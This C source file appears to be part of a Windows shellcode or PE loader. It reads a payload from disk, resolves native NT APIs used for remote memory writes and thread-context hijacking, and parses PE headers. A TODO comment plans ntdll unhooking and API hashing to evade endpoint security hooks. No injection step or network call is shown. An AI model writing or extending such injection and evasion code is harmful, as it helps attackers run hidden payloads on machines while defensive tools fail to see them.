#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"


/*------------------------
 Read the shellcode from
 disk
-------------------------*/
BOOL ReadF(const char* file_path, PDWORD file_size, PVOID* read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		DEBUG_PRINT("[!] Error opening file: %s\n", file_path);
		*file_size = 0;
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size);
	if (*read_buffer == NULL) {
		DEBUG_PRINT("[!] Memory allocation failed\n");
		fclose(file);
		return FALSE;
	}

	fread(*read_buffer, 1, *file_size, file);
	DEBUG_PRINT("[*] Reading PE from disk with size: %d\n", *file_size);
	fclose(file);
	return TRUE;
}


BOOL GetPE(PCONTENT cnt) {

	if (!ReadF(PE_FILE, &(cnt->size), &(cnt->data))) {
		DEBUG_PRINT("[!] Failed reading the shellcode from disk.\n");
		return FALSE;
	}
	return TRUE;
}


/*-----------------------------------------------
  Initialize the NT apis that will be used
  TODO: implement ntdll unhooking from KnownDLLs,
  also use custom GetProcAddress along with
  API hashing
-----------------------------------------------*/
BOOL InitAPIs() {

	HMODULE hModule = GetModuleHandleW(L"NTDLL");
	if (hModule == NULL) {
		DEBUG_PRINT("[!] Failed getting handle to ntdll\n");
		return FALSE;
	}

	NtAPIs.pNtClose = (fnNtClose)GetProcAddress(hModule, "NtClose");
	NtAPIs.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hModule, "NtProtectVirtualMemory");
	NtAPIs.pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hModule, "NtAllocateVirtualMemory");
	NtAPIs.pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hModule, "NtWriteVirtualMemory");
	NtAPIs.pNtSetContextThread = (fnNtSetContextThread)GetProcAddress(hModule, "NtSetContextThread");
	NtAPIs.pNtGetContextThread = (fnNtGetContextThread)GetProcAddress(hModule, "NtGetContextThread");
	NtAPIs.pNtResumeThread = (fnNtResumeThread)GetProcAddress(hModule, "NtResumeThread");
	NtAPIs.pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(hModule, "NtWaitForSingleObject");
	NtAPIs.pNtReadVirtualMemory = (fnNtReadVirtualMemory)GetProcAddress(hModule, "NtReadVirtualMemory");
	NtAPIs.IsInitialized = TRUE;

	return TRUE;
}


/*----------------------------------
  Parse the PE headers and populate
  the struct for further usage
----------------------------------*/
BOOL InitPE(PPEHDRS pPeHdrs, CONTENT cnt) {

	DEBUG_PRINT("[*] Parsing loaded PE file's headers\n");
	pPeHdrs->PeSize = cnt.size;
	pPeHdrs->pPeBuffer = cnt.data;

	//Get NT headers
	pPeHdrs->pNtHeaders = (PIMAGE_NT_HEADERS)(pPeHdrs->pPeBuffer + ((PIMAGE_DOS_HEADER)pPeHdrs->pPeBuffer)->e_lfanew);
	if (pPeHdrs->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] Cant find valid NT headers.\n");
		return FALSE;
	}

	//Check if DLL or not
	if (pPeHdrs->pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
		DEBUG_PRINT("[*] Image is valid DLL\n");
		pPeHdrs->IsDLL = TRUE;
	}
	else {
		pPeHdrs->IsDLL = FALSE;
	}

	DEBUG_PRINT("\t> Populating Data Directories\n");
	pPeHdrs->pSectHeader = IMAGE_FIRST_SECTION(pPeHdrs->pNtHeaders);
	pPeHdrs->pImportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHdrs->pExportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	pPeHdrs->pRelocDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHdrs->pExceptDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHdrs->pTslDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	DEBUG_PRINT("\t> Parsing finished\n");
	return TRUE;
}
